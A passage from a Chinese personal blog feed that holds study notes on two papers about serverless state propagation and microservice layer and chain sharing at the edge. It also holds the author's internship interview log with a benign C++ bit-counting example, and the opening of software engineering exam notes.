src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/6_2_1.jpg" alt></li></ul></li><li>如上图示，将在各个场景中使用不同执行模型获得的平均端到端延迟进行了比较，其中网络设备之间的链路速率从1 Mb/s增加到100 Mb/s。<ul><li>在左上角的图中<ul><li>PureFaaS和StateProp几乎重叠：这是因为状态和参数的大小相对较小；</li><li>直到链路速率低于20 Mb/s，StateLocal具有更低的平均延迟，这要归功于其更智能的仅在需要时传输状态的方法</li><li>然而，随着链路速率的提高，优势逐渐减小，直到延迟高于50 Mb/s和100 Mb/s链路速率下PureFaaS/StateProp的延迟：在如此高的连接速率下，数据传输变得与（或高于）建立TCP连接来检索/更新状态的时间相当</li></ul></li><li>在相反的情况，即右下角的图中<ul><li>StateProp和StateLocal的性能相当</li><li>除了在高链路速率下：这是因为链条比其他情景中的链条要短，数据传输由输入/输出参数主导，这两种方案的处理是一样的</li></ul></li><li>右上图和左下图是中间状况<ul><li>StateLocal在所有较慢的链路速率下都实现了更好的性能</li><li>而PureFaaS始终位于StateProp的顶部。</li></ul></li></ul></li><li>总结：<ul><li>对于函数链，考虑到实际的协议开销，根据状态大小和网络速度，存在将状态保持在边缘节点（StateLocal）和将其嵌入到函数调用中之间的权衡。</li><li>StateProp的性能始终优于PureFaaS。<br><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/6_2_2.jpg" alt></li></ul></li><li>对比函数链时，三种模型中的平均网络流量,如上图，此时链路速度100Mb/s，时StateLocal表现最差的时候<ul><li>PureFaaS生成的流量始终大于StateProp生成的流量，而后者始终大于StateLocal生成的流量</li><li>对于函数链，即使在高网络速度下，StateLocal的开销（以所需的流量速率为衡量）明显低于其他方案，但这并不总是转化为更低的端到端延迟。</li></ul></li></ul><h3 id="dag" tabindex="-1">DAG</h3><ul><li>考虑由一系列阶段组成的应用程序，每个阶段都有一个分支函数，该函数生成多个无状态调用，然后是一个有状态的收集任务。这种结构在ML应用程序中非常典型</li><li>我们使用了3个阶段，每个阶段有5个分支。函数是从边缘节点中随机选择的，状态依赖关系也是随机的，使用与链式结构相同的方法。<br><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/6_2_3.jpg" alt></li><li>在上图中，展示了平均延迟随链路速率从1 Mb/s增加到100 Mb/s的变化（对数-对数图），以及仅针对链路速率为100 Mb/s的网络流量<ul><li>我们发现PureFaaS在所有情况下都优于StateProp，且在参数大小较小时优势更为突出。这是因为调用的总函数数量远远超过链式情况，这会严重影响将所有状态嵌入到调用和响应中。</li><li>StateLocal不需要支付这样的代价，它只传递状态的引用，并在除了非常高的链路速率之外的所有情况下表现最好，这是由于状态检索/更新操作的开销</li></ul></li><li>总结：对于具有大量函数的DAG，只有在函数调用和响应中携带引用时，状态传播才有效，即StateLocal更有效</li></ul><h2 id="7-%E7%BB%93%E8%AE%BA" tabindex="-1">7 结论</h2><ul><li>在本文中，我们探讨了在分布在边缘节点上的无服务器平台上支持有状态应用程序的问题。</li><li>我们重点关注在链式和DAG工作流中沿函数调用传递状态的问题，并提出了三种不同特性的替代方案。</li><li>我们开发了一个原型实现来验证我们的方法的可行性，并使用真实的协议开销来衡量性能。</li><li>结果表明，在函数调用链中传播状态可以显著减少通信开销。这可以降低端到端的应用程序延迟，尤其是在连接有限的情况下。</li><li>然而，对于大型DAG工作流，再嵌入状态以进行传播就不再有效了：在这些情况下，必须在边缘节点上本地存储状态并传递它们的引用。</li></ul><h2 id="%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD" tabindex="-1">专业术语</h2><h3 id="faas-%26-serverless" tabindex="-1">FaaS &amp; Serverless</h3><p>FaaS是一种云计算模型，其中开发者可以编写和部署独立的函数（代码块），并通过云服务提供商的平台执行这些函数。FaaS允许开发者根据需要执行函数，而无需管理底层的服务器和基础设施。每个函数都是独立的、无状态的，以事件驱动的方式触发执行。开发者只需关注函数的实现，而不用担心服务器的管理和扩展性。</p><p>Serverless是一种更广泛的概念，它是构建在FaaS模型之上的。Serverless强调开发者无需关心服务器和基础设施，只需专注于编写代码和业务逻辑。在Serverless架构中，云服务提供商负责自动扩展和管理底层的资源。开发者只需支付根据函数执行时间和资源消耗计算的费用，而无需事先预留或管理服务器。</p><p>FaaS和Serverless提供了更灵活、可扩展的开发和部署方式，使开发者能够更专注于核心业务逻辑而不必担心基础设施的细节。它们在构建微服务、事件驱动应用和处理短暂任务等场景中得到广泛应用，为开发者提供了高度可伸缩、成本效益高的解决方案。</p><h3 id="%E6%97%A0%E7%8A%B6%E6%80%81faas" tabindex="-1">无状态FaaS</h3><ul><li>无状态FaaS指的是函数即服务（FaaS）模型中的一种特性，即函数本身不存储任何状态信息。在无状态FaaS中，每个函数都是独立的、无状态的，它们被设计成接收输入参数并生成输出结果，而不会在函数之间保留任何状态信息。</li><li>这种设计有助于实现函数的高度可伸缩性和灵活性。由于函数本身不存储状态，它们可以独立地扩展和部署，而无需关心底层的服务器和基础设施。此外，无状态函数对于并行执行和容错性也更具优势，因为它们之间没有任何依赖或共享状态。</li><li>然而，无状态FaaS也意味着对于那些需要在函数之间共享和保持状态的应用程序来说，需要依赖外部服务（例如存储或数据库）来管理和存储状态信息。因此，无状态FaaS适用于那些可以通过函数的输入和输出进行完全描述的简单任务或短期计算，而对于复杂的应用程序或需要持久状态的任务，则可能需要其他机制来处理状态管理和共享。</li></ul><h3 id="k8s" tabindex="-1">K8s</h3><ul><li>Kubernetes（通常简称为K8s）是一个开源的容器编排平台，用于自动化部署、扩展和管理容器化应用程序。它提供了一组强大的功能和工具，帮助用户简化容器化应用程序的部署、扩展和运维工作。</li><li>以下是Kubernetes的一些主要特性和概念：<ul><li>容器编排：Kubernetes可以管理和编排容器化的应用程序，使其能够高效地运行在集群中的多个节点上。它可以自动在集群中的节点之间调度容器，并确保应用程序的高可用性和负载均衡。</li><li>自动伸缩：Kubernetes允许根据应用程序的负载情况自动扩展或缩减应用程序的副本数量。这样可以根据实际需求来调整资源的使用，以保证应用程序的性能和可用性。</li><li>服务发现和负载均衡：Kubernetes提供了内建的服务发现机制，可以为应用程序提供稳定的网络地址。同时，它还可以通过负载均衡来分发流量，确保应用程序能够平均地处理请求。</li><li>配置和存储管理：Kubernetes提供了灵活的配置管理机制，可以将应用程序的配置信息与容器分离，使得配置的修改和更新更加方便。此外，Kubernetes还支持多种存储选项，包括持久化存储和临时存储。</li><li>自愈和自修复：Kubernetes具备自愈和自修复的能力，当应用程序出现故障或节点失效时，它可以自动重新启动容器、替换故障节点，并确保应用程序的正常运行。</li><li>扩展性和可插拔性：Kubernetes的设计具有良好的扩展性和可插拔性，可以根据需要添加新的功能和组件。它提供了丰富的API和扩展点，允许开发人员根据自己的需求进行定制和扩展。</li></ul></li><li>总的来说，Kubernetes为容器化应用程序的部署、管理和运维提供了一套完整的解决方案。它可以帮助用户简化复杂的容器编排任务，并提供高可用性、弹性伸缩和自动化管理等功能，使得应用程序能够更加高效和可靠地运行在分布式环境中。</li></ul><h3 id="mininet" tabindex="-1">Mininet</h3><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 边缘计算 </tag>
            
            <tag> Faas </tag>
            
            <tag> ServerLess </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to Share:Balancing Layer and Chain Sharing in Industrial Microservice Deployment</title>
      <link href="/2023/08/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E8%AE%BA%E6%96%87/Balancing%20Layer%20and%20Chain%20Sharing%20in%20Industrial%20Microservice%20Deployment/"/>
      <url>/2023/08/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E8%AE%BA%E6%96%87/Balancing%20Layer%20and%20Chain%20Sharing%20in%20Industrial%20Microservice%20Deployment/</url>
      
        <content type="html"><![CDATA[<h2 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h2><ul><li>随着智能制造的快速发展，面向边缘计算的微服务平台正在成为生产控制的重要组成部分。</li><li>在微服务的容器化部署中：<ul><li>层共享可以减少由于镜像拉取而导致的巨大带宽消耗</li><li>而链共享可以减少微服务之间通信引起的通信开销</li></ul></li><li>这两种共享方法利用每个微服务的特性在部署过程中共享资源。然而，由于边缘服务器资源有限，很难同时满足这两种方法的优化目标。因此，通过平衡这两种共享方法来实现提高服务响应效率至关重要。</li><li>本文研究了一种能够平衡微服务的层共享和链共享的最佳微服务部署策略。我们通过模型重构，将最小化微服务镜像拉取延迟和通信开销的问题转化为线性约束整数二次规划问题。通过连续凸近似（SCA）方法得到一个部署策略。</li><li>实验结果表明，所提出的部署策略可以平衡这两种资源共享方法。当两种共享方法被平等考虑时，平均镜像拉取延迟可以降低到基准值的65％，平均通信开销可以降低到基准值的30％。</li></ul><h2 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h2><ul><li><p>传统的工业软件采用单体服务架构。服务内部的高耦合和占用率会增加整个系统的复杂性。其可扩展性、稳定性和容错性很难满足智能制造的要求。</p></li><li><p>通过微服务架构，一个完整的服务可以拆分为多个松耦合的微服务。不同的微服务在逻辑上是独立的，具有很高的灵活性、可扩展性和容错性，可以很好地适应智能制造的需求。</p></li><li><p>根据不同的服务请求和部署策略，将打包成Docker镜像的每个微服务可以通过容器编排工具k8s部署到边缘服务器上。</p></li><li><p>在微服务的容器化部署中，服务效率是评估部署解决方案质量的重要指标。服务效率主要受两个方面的影响。</p><ul><li>一方面是微服务的启动时间。它主要取决于Docker镜像的拉动延迟，这些镜像通过不同的镜像层存储在云端</li><li>另一方面是微服务之间的通信开销。它取决于微服务之间的数据交换量。<ul><li>一个工业应用可以由部署在一个或多个边缘服务器上的多个微服务完成。这些微服务可以被称为微服务链，同一微服务链中的微服务之间将频繁进行数据交换。</li></ul></li></ul></li><li><p>基于上述两个方面，通过资源共享来提高服务效率非常重要。为提高服务效率，有两种资源共享策略。</p><ul><li>一种资源共享策略是层共享：Docker原生支持层的共享。如果部署在同一边缘服务器上的微服务使用相同的镜像层，拉取镜像时将不会重复拉取该层。这个层可以被服务器上的所有微服务共享。层共享可以有效减少镜像拉取延迟，从而提高微服务的启动速度和服务响应效率。</li><li>另一种资源共享策略是链共享：它可以定义为部署在同一服务器上的微服务之间的数据共享。在微服务链中，相邻的两个微服务之间会频繁进行数据传输。如果两个微服务部署在同一服务器上，下一个微服务可以通过链共享直接访问数据，而无需进行多跳数据传输。链共享可以减少数据传输引起的延迟和数据丢失。</li></ul></li><li><p>由于边缘服务器的资源有限，不可能将所有的微服务都部署在同一台边缘服务器上。因此，有必要找到一种在层共享和链共享之间进行权衡的最优微服务部署策略。</p></li><li><p>由于边缘服务器的资源有限，微服务部署策略无法同时充分利用不同的资源，因此，还需要一种方法来合理地分配资源给部署在服务器上的不同微服务，并最大化资源的利用。</p></li><li><p>本文贡献：</p><ul><li><ol><li>我们通过同一模型描述了微服务的分层结构和链式结构。建立了一个整数规划问题，以最小化镜像拉取延迟和通信开销。</li></ol></li><li><ol start="2"><li>通过模型重构，证明了整数规划问题可以转化为带有线性约束的整数二次规划问题。通过使用连续凸逼近（SCA）方法获得最优解。该方法可以有效平衡镜像拉取延迟和通信开销。</li></ol></li><li><ol start="3"><li>提出了一种用于边缘服务器的资源重新分配算法，以充分利用闲置的计算资源。</li></ol></li><li><ol start="4"><li>通过实验，在镜像拉取延迟和服务间通信开销等多个维度上评估了结果。实验证明了所提方法的有效性。</li></ol></li></ul></li></ul><p>第2节简要回顾了相关文献。<br>第3节对系统的分层结构和链式结构进行建模，并给出了问题的形式化描述。<br>第4节解决了提出的问题。<br>第5节提出了一种用于边缘服务器的资源重新分配算法。<br>第6节评估了所提方法的结果。<br>第7节讨论了限制和未来工作。<br>第8节对论文进行了总结。</p><h2 id="2-%E7%9B%B8%E5%85%B3%E5%B7%A5%E4%BD%9C" tabindex="-1">2 相关工作</h2><h2 id="3-%E7%B3%BB%E7%BB%9F%E5%BB%BA%E6%A8%A1%E5%92%8C%E9%97%AE%E9%A2%98%E8%A1%A8%E8%BF%B0" tabindex="-1">3 系统建模和问题表述</h2><h3 id="3.1-%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E4%BE%8B%E5%AD%90" tabindex="-1">3.1 一个简单例子</h3><p><img src="/images/%E8%AE%BA%E6%96%87/Balancing%20Layer%20and%20Chain%20Sharing%20in%20IIndustrial%20Microservice%20Deployment/3_1.png" alt><br><img src="/images/%E8%AE%BA%E6%96%87/Balancing%20Layer%20and%20Chain%20Sharing%20in%20IIndustrial%20Microservice%20Deployment/3_2.png" alt></p><ul><li><p>如图示，考虑一个有两个微服务和一个有三个微服务的应用程序，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><msub><mi>s</mi><mrow><mi>k</mi><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">ms_{ki}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord mathnormal">m</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ki</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>表示第k个软件的第i个微服务</p></li><li><p>每个微服务镜像有不同数量的镜像层组成。三个服务器与云服务器之间的带宽为120 MB/s，并且两个相邻服务器之间可以通过单跳到达。</p></li><li><p>a为层共享策略，此时将有相同镜像层的微服务部署在一起，可以实现镜像层的共享，但同一软件间需要传输数据。</p></li><li><p>b为链共享策略，同一软件的微服务在一个服务器上部署，传输数据大小为0，但要拉取所有镜像</p></li><li><p>c为同时考虑链共享和层共享，三种策略的具体时间比较见表。</p></li></ul><h3 id="3.2-%E7%B3%BB%E7%BB%9F%E6%A8%A1%E5%9E%8B" tabindex="-1">3.2 系统模型</h3><h3 id="3.3-%E9%97%AE%E9%A2%98%E5%BD%A2%E5%BC%8F%E5%8C%96%E6%8F%8F%E8%BF%B0" tabindex="-1">3.3 问题形式化描述</h3><h2 id="4-%E5%9F%BA%E4%BA%8Esca%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%83%A8%E7%BD%B2%E6%96%B9%E6%A1%88" tabindex="-1">4 基于SCA的微服务部署方案</h2><h3 id="4.1-%E9%97%AE%E9%A2%98%E8%BD%AC%E5%8C%96" tabindex="-1">4.1 问题转化</h3><h3 id="4.2-%E5%9F%BA%E4%BA%8Esca%E7%9A%84%E6%96%B9%E6%B3%95" tabindex="-1">4.2 基于SCA的方法</h3><h3 id="4.3-%E6%94%B6%E6%95%9B%E5%88%86%E6%9E%90" tabindex="-1">4.3 收敛分析</h3><h2 id="5-%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E6%96%B9%E6%B3%95" tabindex="-1">5 资源分配方法</h2><h3 id="5.1-%E9%97%AE%E9%A2%98%E6%8F%8F%E8%BF%B0" tabindex="-1">5.1 问题描述</h3><h3 id="5.2-%E5%9F%BA%E4%BA%8E%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E4%B9%98%E6%95%B0%E6%B3%95%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88" tabindex="-1">5.2 基于拉格朗日乘数法的解决方案</h3><h2 id="6-%E8%A1%A8%E7%8E%B0%E8%AF%84%E4%BC%B0" tabindex="-1">6 表现评估</h2><h3 id="6.1-%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C" tabindex="-1">6.1 模拟实验</h3><h3 id="6.2-%E7%94%A8%E7%9C%9F%E5%AE%9E%E7%9A%84%E8%BE%B9%E7%BC%98%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9B%E8%A1%8C%E5%AE%9E%E9%AA%8C" tabindex="-1">6.2 用真实的边缘服务器进行实验</h3><h3 id="6.3-%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%A1%88%E4%BE%8B" tabindex="-1">6.3 大规模的案例</h3><h2 id="7-%E8%AE%A8%E8%AE%BA" tabindex="-1">7 讨论</h2><ul><li><p>高时间和空间复杂性：所提出的方法在大规模场景中具有高时间和空间复杂性。虽然可以在可接受的时间内获得最优解，但需要进一步优化以提高可扩展性。未来的研究应着重开发高效的算法或优化技术，以降低计算复杂度。</p></li><li><p>考虑请求频率：通信开销不仅取决于通信数据量，还取决于请求频率。即使每次传输的数据量较小，高请求频率也会显著增加通信开销。在计算通信开销时，考虑通信数据量和请求频率的乘积是非常重要的。未来的工作可以探索将请求频率作为输入参数，以准确估计通信开销。</p></li><li><p>动态微服务部署：微服务不是静态的，部署过程涉及关闭、迁移和添加新的微服务。在面对动态场景时，需要相应的部署算法以适应变化。未来的研究可以探索使用人工智能或其他方法，在初始部署结果之后进行训练，以动态调整微服务的部署。</p></li></ul><h2 id="8-%E7%BB%93%E8%AE%BA" tabindex="-1">8 结论</h2><ul><li>本文研究了微服务的层共享和链共享，并探索了一种可以平衡这两种资源共享方式的微服务部署方案。<ul><li>我们建立了一个旨在最小化图像拉取延迟和通信开销的问题。通过模型重构，将问题转化为一个具有线性约束的整数二次规划问题，并通过连续凸逼近（SCA）方法获得部署策略。</li><li>我们还提出了一种资源重新分配算法，以充分利用服务器的空闲资源。</li></ul></li></ul><h2 id="%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A" tabindex="-1">名词解释</h2><h3 id="docker%E7%9A%84%E5%B1%82%E7%BA%A7" tabindex="-1">Docker的层级</h3><ul><li><p>Docker 镜像是构建容器的基础，它包含了一个完整的文件系统，包括操作系统、应用程序和依赖项。镜像是只读的，意味着一旦创建就不可更改。</p></li><li><p>Docker 镜像采用了分层的文件系统结构，这是 Docker 的一个重要特性。每个镜像由多个文件系统层构成，每个层都是只读的，并且可以被其他镜像共享和重用。这种分层结构使得镜像的构建和管理变得非常高效。</p></li><li><p>下面是 Docker 镜像层的一些重要概念：</p><ul><li>基础镜像层（Base Image Layer）：这是 Docker 镜像的第一个层，它通常包含操作系统的基本文件系统。基础镜像层是只读的，所有其他层都依赖于它。</li><li>中间镜像层（Intermediate Image Layers）：在构建 Docker 镜像时，可以在基础镜像层之上添加多个中间镜像层。每个中间镜像层都是基于前一个层进行的修改或添加，例如安装软件包、配置环境等。每个中间镜像层都会生成一个唯一的标识符，用于表示该层的内容。</li><li>最终镜像层（Final Image Layer）：最后一个中间镜像层被称为最终镜像层。它是由之前的中间镜像层构建而成，代表了完整的容器镜像。最终镜像层是可读写的，并且可以在容器中运行和修改。</li></ul></li><li><p>使用分层结构的好处是，当多个镜像共享相同的层时，这些层只需要在磁盘上存储一次，可以被多个镜像同时使用，节省了存储空间。此外，当基础镜像或中间镜像层发生变化时，只需重新构建受影响的层，而不必重新构建整个镜像，提高了构建速度和效率。</p></li><li><p>总结一下，Docker 镜像层是构成 Docker 镜像的一组只读文件系统层，通过分层结构实现了高效的镜像构建和共享。每个镜像层都包含了特定的文件系统更改或添加，最终构成一个完整的容器镜像。</p></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试记录</title>
      <link href="/2023/08/16/%E6%9D%82%E8%AE%B0/%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C/"/>
      <url>/2023/08/16/%E6%9D%82%E8%AE%B0/%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="%E9%98%BF%E9%87%8C" tabindex="-1">阿里</h2><h3 id="2023%E5%AE%9E%E4%B9%A0%E9%98%BF%E9%87%8Cc%2B%2B%E5%AE%A2%E6%88%B7%E7%AB%AF" tabindex="-1">2023实习阿里C++客户端</h3><h4 id="%E7%AC%94%E8%AF%95" tabindex="-1">笔试</h4><p>408+ACM算法</p><h4 id="%E4%B8%80%E9%9D%A2" tabindex="-1">一面</h4><ul><li><p>自我介绍</p></li><li><p>手写栈，队列，优先队列，延迟队列。</p></li><li><p>tcp和udp关系</p></li><li><p>三次握手时，最后发送方没收到ack有哪些原因</p></li><li><p>c++和Java区别关系。</p></li><li><p>c11特性新特性</p></li><li><p>面向对象几个特性最重要的是哪个，为什么</p></li><li><p>进程和线程。</p></li><li><p>线程并发控制。</p></li><li><p>进程通讯。</p></li><li><p>github看过的项目那个最有趣，修的课那个最有趣</p></li><li><p>算法：给2n个数，分成两组，每组n个数，使得和最接近</p></li><li><p>总结：第一次面试，八股文就没准备，全靠平时基础，而且很紧张，但不知道为什么还能二面，但是最近也比较忙，八股文还是没时间背，急急急，看二面能运气过不</p></li></ul><h4 id="%E4%BA%8C%E9%9D%A2" tabindex="-1">二面</h4><ul><li>自我介绍</li><li>项目介绍</li><li>谈学习方法</li><li>C++和JAVA</li><li>聊天</li></ul><p>这次感觉还行，没问八股啥的，总体来说不是很紧张，可惜第二天反手就挂了，乐，简历又回归人才库继续转了</p><h2 id="%E8%85%BE%E8%AE%AF" tabindex="-1">腾讯</h2><h3 id="2023-wxg-%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91%E5%AE%9E%E4%B9%A0" tabindex="-1">2023 WXG 后端开发实习</h3><p>简历过了后就直接到面试了</p><h4 id="%E4%B8%80%E9%9D%A2-1" tabindex="-1">一面</h4><p>自我介绍</p><p>在线写题：</p><ol><li>给定一个字符串A和一个字符串集合B，找到B中字符串在A中的索引出现位置并标记出来（直接暴力）</li><li>实现一个单例模式，要求线程安全，懒汉模式</li><li>寻找二叉搜索树中的第三大值</li><li>反转链表</li></ol><p>八股：OS系统调用，计网MTU，C++多态实现</p><p>一面完直接挂了，真不戳，当时面的时候面试官找题找了10min+，还在跟别人聊天，看来对我确实是不上心了，虽然我也很菜</p><h2 id="%E5%8D%8E%E4%B8%BA" tabindex="-1">华为</h2><h3 id="2023-bg%E7%BB%88%E7%AB%AF%E7%A1%AC%E4%BB%B6-%E5%AE%9E%E4%B9%A0" tabindex="-1">2023 BG终端硬件 实习</h3><p>当时忘改第一志愿部门了，之后发现改不了了，硬着头皮面了，蚌，确实是硬件，贴近底层</p><p>自我介绍；<br>关于自我介绍聊了会天；<br>询问项目；</p><p>共享屏幕写题：一个超大文件，无法完全放入内存，请使用C++总计该文件bit流中的1的个数</p><p>chatgpt解答：在处理一个超大文件时，无法将整个文件加载到内存中。为了计算该文件中的1的个数，你可以使用逐位读取的方式来统计。以下是一个使用C++编写的示例代码：</p><pre><code class="language-C++">#include &lt;iostream&gt;#include &lt;fstream&gt;// 计算一个整数中的1的个数int countOnes(unsigned int num) &#123;    int count = 0;    while (num) &#123;        count += num &amp; 1;        num &gt;&gt;= 1;    &#125;    return count;&#125;int main() &#123;    std::ifstream file(&quot;path/to/your/file.bin&quot;, std::ios::binary);    if (!file) &#123;        std::cout &lt;&lt; &quot;Failed to open the file.&quot; &lt;&lt; std::endl;        return 1;    &#125;    unsigned char byte;    unsigned long long totalCount = 0;    // 逐字节读取文件内容    while (file.read(reinterpret_cast&lt;char*&gt;(&amp;byte), sizeof(byte))) &#123;        // 计算每个字节中1的个数并累加        totalCount += countOnes(byte);    &#125;    file.close();    std::cout &lt;&lt; &quot;Total count of 1s: &quot; &lt;&lt; totalCount &lt;&lt; std::endl;    return 0;&#125;</code></pre><p>这种文件读入确实不会，算是硬件岗吧，果然直接挂了，期望其它志愿可以面到</p><h2 id="%E5%B0%8F%E7%B1%B3" tabindex="-1">小米</h2><h3 id="2023-java%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91-%E5%AE%9E%E4%B9%A0" tabindex="-1">2023 Java程序开发 实习</h3><p>简历过了直接面试。<br>聊了项目，问了java Hashtable那一系列，多线程等，我确实基础不太行，最后面试官说明希望是一个基础牢固的，过来可以直接开发的实习生，所以潜意思应该是我不太行了，最后也是很快就挂了，不过处于流程还是要写代码的。</p><p>代码题：问有n个数，范围为[0-n]，每个数各不相同，问如何直到哪个数没有<br>解法：将所有数求和用n*(n+1)/2减去即是答案</p><h2 id="%E5%AD%97%E8%8A%82" tabindex="-1">字节</h2><h3 id="2023-%E9%A3%9E%E4%B9%A6%E5%90%8E%E7%AB%AF%E6%97%A5%E5%B8%B8%E5%AE%9E%E4%B9%A0" tabindex="-1">2023 飞书后端日常实习</h3><h4 id="%E4%B8%80%E9%9D%A2-2" tabindex="-1">一面</h4><ul><li><p>自我介绍</p></li><li><p>算法题：</p><ul><li>题目：将一个字符串的大小写字母转换，输出所有可能转换的字符串</li><li>做法：直接dfs回溯即可</li></ul></li><li><p>聊项目</p></li><li><p>八股</p><ul><li>计网<ul><li>HTTPS，SSL加密过程</li><li>HTTP请求的全过程（DNS服务器）</li><li>TCP/IP协议 传输信息的过程</li><li>TCP/IP协议 中帧的各请求头的信息</li><li>网络攻击手段：DDOS，反射</li></ul></li><li>操作系统<ul><li>如何让CPU满载</li><li>CPU利用率</li></ul></li><li>数据库<ul><li>索引的数据结构</li><li>隔离等级</li></ul></li></ul></li><li><p>哎，八股太差了，看过的记不住</p></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件工程期末突击</title>
      <link href="/2023/08/16/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/"/>
      <url>/2023/08/16/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="%E7%AC%AC%E4%B8%80%E7%AB%A0-%E4%BB%8E%E7%A8%8B%E5%BA%8F%E5%88%B0%E8%BD%AF%E4%BB%B6" tabindex="-1">第一章 从程序到软件</h2><h3 id="1-%E4%BD%95%E4%B8%BA%E7%A8%8B%E5%BA%8F%E5%8F%8A%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%B4%A8%E9%87%8F%E8%A6%81%E6%B1%82" tabindex="-1">1 何为程序及程序的质量要求</h3><h4 id="%EF%BC%881%EF%BC%89%E4%BD%95%E4%B8%BA%E7%A8%8B%E5%BA%8F" tabindex="-1">（1）何为程序</h4><ul><li>程序（Program）是由程序设计语言所描述的、能为计算机所理解和处理的一组语句序列</li><li>程序严格遵循程序设计语言的各项语法和语义规定</li><li>程序代码可表现为二种形式<ul><li>源代码（Source Code）：用程序设计语言所描述的代码</li><li>可执行代码（Executable Code）：可执行的二进制或中间码</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89-%E7%A8%8B%E5%BA%8F%E7%BB%84%E6%88%90" tabindex="-1">（2） 程序组成</h4><ul><li>语句：声明、定义、控制、计算等；实现特定的功能；</li><li>模块：包，类，方法；每个模块实现特定功能</li></ul><h4 id="%EF%BC%883%EF%BC%89%E7%A8%8B%E5%BA%8F%E7%9A%84%E4%BA%8C%E7%B1%BB%E5%88%A9%E7%9B%8A%E7%9B%B8%E5%85%B3%E8%80%85" tabindex="-1">（3）程序的二类利益相关者</h4><ul><li>用户：<ul><li>程序的运行展示 <strong>功能和性能</strong></li><li>满足和实现用户的<strong>需求</strong></li></ul></li><li>程序员<ul><li>编写，阅读维护程序</li><li>发现和修改程序中的缺陷</li></ul></li><li>用户和程序员对程序有这不同的质量需求</li></ul><h4 id="%EF%BC%884%EF%BC%89%E7%A8%8B%E5%BA%8F%E8%B4%A8%E9%87%8F%E7%9A%84%E5%86%85%E5%9C%A8%E5%92%8C%E5%A4%96%E5%9C%A8%E4%BD%93%E7%8E%B0" tabindex="-1">（4）程序质量的内在和外在体现</h4><ul><li>外在(External)质量<ul><li>用户视点</li><li>对外可展示，用户可直接感触到、所关心的</li><li>使用流畅性、响应速度、界面美观、操作简易性、运行可靠性等</li></ul></li><li>内在(Internal)质量<ul><li>程序员视点</li><li>体现在程序的内在方面，程序员可以感触到的、所关心的</li><li>易于理解、结构清晰、易于修改、可重用好等</li></ul></li></ul><h3 id="2-%E7%A8%8B%E5%BA%8F%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81%E6%96%B9%E6%B3%95" tabindex="-1">2 程序质量保证方法</h3><ul><li>程序质量保证方法<ul><li>遵循编码风格</li><li>采用程序设计方法</li><li>开展代码重用</li><li>进行结对编程</li><li></li></ul></li></ul><h4 